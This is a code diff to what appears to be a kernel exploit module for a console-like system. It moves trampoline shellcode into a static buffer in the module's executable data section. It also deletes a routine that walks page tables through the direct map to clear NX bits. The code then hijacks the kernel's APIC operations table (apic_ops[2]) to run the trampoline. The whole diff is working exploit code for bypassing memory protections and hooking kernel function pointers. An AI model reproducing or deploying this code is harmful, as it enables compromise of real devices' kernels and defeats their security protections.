@@ -79,6 +79,14 @@
 
 #define MIN_KERN_ADDR    0xFFFF800000000000ULL
 
+/*
+ * Static buffer for the trampoline shellcode.
+ * Lives in the kmod's .data section, which is part of the exec_code
+ * allocation that kldload already NX-clears. So this buffer is
+ * automatically executable — no DMAP walk or NX clearing needed.
+ */
+static uint8_t trampoline_buf[256] __attribute__((aligned(16)));
+
 typedef struct {
     uint64_t kdata_base;
     uint32_t fw_ver;
@@ -99,89 +107,6 @@ static inline uint64_t read8(uint64_t addr)
 static inline void write8(uint64_t addr, uint64_t val)
 {
     *(volatile uint64_t*)addr = val;
-}
-
-static inline uint64_t read_cr3(void)
-{
-    uint64_t val;
-    __asm__ volatile("movq %%cr3, %0" : "=r"(val));
-    return val;
-}
-
-/*
- * Clear NX bit on the page containing `vaddr`.
- * Walks the 4-level page table using DMAP to access physical pages.
- * Returns 1 on success, 0 on failure.
- */
-static int clear_nx_on_page(uint64_t vaddr, uint64_t dmap_base)
-{
-    uint64_t cr3 = read_cr3();
-    uint64_t pml4_phys = cr3 & ~0xFFFULL;
-
-    /* Extract page table indices */
-    uint64_t pml4_idx = (vaddr >> 39) & 0x1FF;
-    uint64_t pdpt_idx = (vaddr >> 30) & 0x1FF;
-    uint64_t pd_idx   = (vaddr >> 21) & 0x1FF;
-    uint64_t pt_idx   = (vaddr >> 12) & 0x1FF;
-
-    /* Walk PML4 */
-    uint64_t pml4e = read8(dmap_base + pml4_phys + pml4_idx * 8);
-    if (!(pml4e & 1)) return 0;  /* not present */
-
-    /* Walk PDPT */
-    uint64_t pdpt_phys = pml4e & 0x000FFFFFFFFFF000ULL;
-    uint64_t pdpte = read8(dmap_base + pdpt_phys + pdpt_idx * 8);
-    if (!(pdpte & 1)) return 0;
-    if (pdpte & (1ULL << 7)) {
-        /* 1GB page — clear NX (bit 63) */
-        uint64_t addr = dmap_base + pdpt_phys + pdpt_idx * 8;
-        write8(addr, pdpte & ~(1ULL << 63));
-        __asm__ volatile("invlpg (%0)" :: "r"(vaddr) : "memory");
-        return 1;
-    }
-
-    /* Walk PD */
-    uint64_t pd_phys = pdpte & 0x000FFFFFFFFFF000ULL;
-    uint64_t pde = read8(dmap_base + pd_phys + pd_idx * 8);
-    if (!(pde & 1)) return 0;
-    if (pde & (1ULL << 7)) {
-        /* 2MB page — clear NX */
-        uint64_t addr = dmap_base + pd_phys + pd_idx * 8;
-        write8(addr, pde & ~(1ULL << 63));
-        __asm__ volatile("invlpg (%0)" :: "r"(vaddr) : "memory");
-        return 1;
-    }
-
-    /* Walk PT */
-    uint64_t pt_phys = pde & 0x000FFFFFFFFFF000ULL;
-    uint64_t pte_addr = dmap_base + pt_phys + pt_idx * 8;
-    uint64_t pte = read8(pte_addr);
-    if (!(pte & 1)) return 0;
-
-    /* Clear NX (bit 63) */
-    write8(pte_addr, pte & ~(1ULL << 63));
-    __asm__ volatile("invlpg (%0)" :: "r"(vaddr) : "memory");
-    return 1;
-}
-
-/*
- * Detect DMAP base by probing known candidates.
- * Returns DMAP base or 0 on failure.
- */
-static uint64_t detect_dmap_base(void)
-{
-    uint64_t cr3_phys = read_cr3() & ~0xFFFULL;
-    uint64_t candidates[] = {
-        0xFFFFF80000000000ULL,
-        0xFFFFD80000000000ULL,
-        0xFFFFE00000000000ULL,
-    };
-    for (int i = 0; i < 3; i++) {
-        uint64_t val = read8(candidates[i] + cr3_phys);
-        if (val & 1)  /* PML4 entry present bit */
-            return candidates[i];
-    }
-    return 0;
 }
 
 /*
@@ -420,47 +345,17 @@ int module_start(kproc_args* args)
     for (int i = 0; i < CAP_TOTAL; i++)
         write8(capture_buf + i * 8, 0);
 
-    /* Build trampoline shellcode in the output buffer's upper region.
-     * We use kthread_args buffer at offset 0x600 for shellcode.
-     * This is part of the kproc's stack-allocated args, which lives
-     * in kernel heap (malloc'd by kldload). We already clear NX on
-     * the kldload code pages, and the args buffer is on the same
-     * or adjacent page. But to be safe, we should put it somewhere
-     * we know is executable.
+    /* Build trampoline in the static buffer (trampoline_buf).
+     * This buffer is in the kmod's .data section, which lives in the
+     * exec_code allocation that kldload already NX-cleared.
+     * So it's automatically executable — no DMAP walk needed.
      *
-     * Actually: the trampoline needs to survive after our kthread exits.
-     * So we can't use stack memory. We need persistent executable memory.
-     *
-     * Solution: write shellcode to kdata (which persists and has NX cleared
-     * by previous pcb_overwrite runs). Use kdata_base + 0x400 for shellcode
-     * (after the capture buffer at +0x200).
+     * The trampoline survives as long as exec_code isn't freed,
+     * which is fine since we restore apic_ops[2] before returning.
      */
-    uint64_t trampoline_addr = kdata_base + 0x400;
-    uint8_t *tramp_buf = (uint8_t *)trampoline_addr;
-
-    build_trampoline(tramp_buf, capture_buf, original_xapic);
+    uint64_t trampoline_addr = (uint64_t)trampoline_buf;
+    build_trampoline(trampoline_buf, capture_buf, original_xapic);
     out[4] = trampoline_addr;
-
-    /* Clear NX on the trampoline page so it's executable.
-     * Walk guest page tables via DMAP and clear bit 63 on the PTE. */
-    uint64_t dmap_base = detect_dmap_base();
-    out[8] = dmap_base;  /* report DMAP base for debugging */
-
-    if (dmap_base == 0) {
-        out32[1] = 0xFB;  /* error: can't find DMAP */
-        apic_table[2] = original_xapic;
-        out[40] = 0xdeadbeefcafe0010ULL;
-        return 0;
-    }
-
-    int nx_result = clear_nx_on_page(trampoline_addr, dmap_base);
-    out[9] = (uint64_t)nx_result;  /* 1=success, 0=failed */
-
-    if (!nx_result) {
-        out32[1] = 0xFA;  /* error: NX clear failed */
-        out[40] = 0xdeadbeefcafe0010ULL;
-        return 0;
-    }
 
     /* Install trampoline: overwrite apic_ops[2] */
     apic_table[2] = trampoline_addr;
